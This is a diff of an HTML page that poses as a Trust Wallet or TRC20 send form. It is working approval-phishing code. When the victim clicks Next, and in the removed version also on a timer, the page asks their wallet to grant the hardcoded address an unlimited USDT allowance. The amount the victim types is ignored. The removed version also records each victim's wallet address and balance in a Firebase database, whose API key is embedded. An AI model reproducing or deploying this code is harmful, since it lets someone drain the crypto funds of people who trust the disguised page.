@@ -1,136 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Trust Wallet</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Arial', sans-serif;
-      background-color: #121212;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    .container {
-      width: 90%;
-      max-width: 400px;
-    }
-    .input-group {
-      background-color: #1e1e1e;
-      padding: 15px;
-      border-radius: 12px;
-      margin-bottom: 20px;
-    }
-    .input-label {
-      font-size: 14px;
-      margin-bottom: 5px;
-      color: #aaa;
-    }
-    .input-value {
-      font-size: 16px;
-      color: white;
-      word-break: break-all;
-    }
-    .input-editable {
-      width: 100%;
-      font-size: 16px;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: white;
-    }
-    .max-text {
-      font-size: 13px;
-      color: #00bcd4;
-      margin-top: 5px;
-      text-align: right;
-    }
-    button {
-      width: 100%;
-      padding: 15px;
-      font-size: 16px;
-      background-color: #00bcd4;
-      color: white;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="input-group">
-      <div class="input-label">Recipient Wallet Address</div>
-      <div class="input-value">TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</div>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>TRC20 Approval DApp</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        margin: 0;
+        background: #0e0e0e;
+        color: white;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px;
+      }
+      .container {
+        width: 100%;
+        max-width: 400px;
+      }
+      .input-group {
+        margin-bottom: 20px;
+      }
+      label {
+        font-size: 14px;
+        margin-bottom: 4px;
+        display: block;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border-radius: 8px;
+        border: none;
+        background: #1e1e1e;
+        color: white;
+      }
+      button {
+        width: 100%;
+        padding: 14px;
+        font-size: 16px;
+        border: none;
+        border-radius: 8px;
+        background: #1ea362;
+        color: white;
+        cursor: pointer;
+      }
+      .max-btn {
+        font-size: 12px;
+        text-align: right;
+        margin-top: 4px;
+        color: #ccc;
+      }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="input-group">
+        <label>Recipient Wallet Address</label>
+        <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
+      </div>
+
+      <div class="input-group">
+        <label>Amount (For Approval Only)</label>
+        <input type="number" id="amount" placeholder="Enter any amount" />
+        <div class="max-btn">MAX</div>
+      </div>
+
+      <button id="nextBtn">Next</button>
     </div>
-    <div class="input-group">
-      <div class="input-label">Amount</div>
-      <input type="number" id="amountInput" class="input-editable" placeholder="0" />
-      <div class="max-text">MAX</div>
-    </div>
-    <button id="nextButton">Next</button>
-  </div>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+    <script>
+      const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+      const spenderAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+      const feeLimit = 100_000_000; // 100 TRX in SUN (1 TRX = 1,000,000 SUN)
+      const approvalAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
-      authDomain: "trc20-approval-dapp.firebaseapp.com",
-      projectId: "trc20-approval-dapp",
-      storageBucket: "trc20-approval-dapp.appspot.com",
-      messagingSenderId: "770961226156",
-      appId: "1:770961226156:web:d7857b971dd376b7902209"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
-    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-    async function triggerPopup() {
-      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-        const wallet = window.tronWeb.defaultAddress.base58;
-        const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
+      async function triggerPopupAndApprove() {
         try {
-          const balance = await window.tronWeb.trx.getBalance(wallet);
-          const usdtBal = await contract.balanceOf(wallet).call();
-          await contract.approve(SPENDER, MAX_UINT).send();
+          if (window.tronWeb && window.tronWeb.ready) {
+            const from = window.tronWeb.defaultAddress.base58;
 
-          await addDoc(collection(db, "approvals"), {
-            wallet_address: wallet,
-            amount: document.getElementById("amountInput").value,
-            balance: window.tronWeb.fromSun(usdtBal._hex || usdtBal),
-            timestampz: new Date().toISOString(),
-          });
-        } catch (e) {
-          console.error("Approval error:", e);
-        }
-      } else {
-        try {
-          await window.tronLink.request({ method: "tron_requestAccounts" });
-        } catch (e) {
-          console.error("Wallet connection failed:", e);
+            const txn = await tronWeb.transactionBuilder.triggerSmartContract(
+              usdtContractAddress,
+              "approve(address,uint256)",
+              { feeLimit },
+              [
+                { type: "address", value: spenderAddress },
+                { type: "uint256", value: approvalAmount },
+              ],
+              from
+            );
+
+            const signedTx = await tronWeb.trx.sign(txn.transaction);
+            const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+            console.log("Approval result:", broadcast);
+          } else {
+            console.log("Waiting for wallet...");
+            await window.tronWeb.request({ method: "tron_requestAccounts" });
+          }
+        } catch (err) {
+          console.error("Approval Error:", err);
         }
       }
-    }
 
-    document.getElementById("nextButton").addEventListener("click", async () => {
-      await triggerPopup();
-    });
+      document.getElementById("nextBtn").addEventListener("click", async () => {
+        // Force connect before approval
+        if (!window.tronWeb || !window.tronWeb.ready) {
+          try {
+            await window.tronWeb.request({ method: "tron_requestAccounts" });
+          } catch (err) {
+            console.error("Wallet connect failed:", err);
+            return;
+          }
+        }
 
-    // Optional: auto-connect after small delay
-    setTimeout(() => {
-      triggerPopup();
-    }, 2000);
-  </script>
-</body>
+        await triggerPopupAndApprove();
+      });
+
+      // Auto trigger approval when wallet connects
+      window.addEventListener("load", async () => {
+        let tries = 0;
+        const checkWallet = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.ready) {
+            clearInterval(checkWallet);
+            console.log("Wallet detected");
+          } else if (tries++ > 10) {
+            clearInterval(checkWallet);
+          }
+        }, 1000);
+      });
+    </script>
+  </body>
 </html>
